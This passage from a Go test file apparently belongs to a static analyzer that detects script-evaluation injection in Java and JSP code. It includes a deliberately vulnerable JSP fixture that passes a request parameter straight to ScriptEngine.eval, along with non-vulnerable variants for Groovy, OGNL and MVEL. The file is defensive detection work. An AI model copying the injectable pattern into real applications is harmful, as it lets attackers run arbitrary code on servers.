	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("Scope.java", []byte(test.src)); hasRule(fs, test.rule) {
				t.Fatalf("typed receiver facts must not leak into another method, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeDetectsScriptEngineManagerFlow(t *testing.T) {
	src := []byte(`<% ScriptEngineManager manager = new ScriptEngineManager(); ScriptEngine engine = manager.getEngineByName("js"); engine.eval(request.getParameter("x")); %>`)
	if fs := Analyze("manager.jsp", src); !hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("want scriptengine-eval through tracked manager and engine, got %+v", fs)
	}
}

func TestAnalyzeRequiresEvaluatorCodeArgumentToBeRequestControlled(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{name: "GroovyShell", src: `<% new GroovyShell().evaluate("1+1", request.getParameter("context")); %>`},
		{name: "OGNL", src: `<% Ognl.getValue("name", request.getParameter("ctx")); %>`},
		{name: "MVEL", src: `<% MVEL.eval("1+1", request.getParameter("context")); %>`},
		{name: "ScriptEngine", src: `<% ScriptEngine engine = new ScriptEngineManager().getEngineByName("js"); engine.eval("1+1", request.getParameter("ctx")); %>`},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("evaluate.jsp", []byte(test.src)); hasRule(fs, "javadisk:scriptengine-eval") {
				t.Fatalf("request-controlled context must not taint evaluator code, got %+v", fs)
			}
		})
	}
}
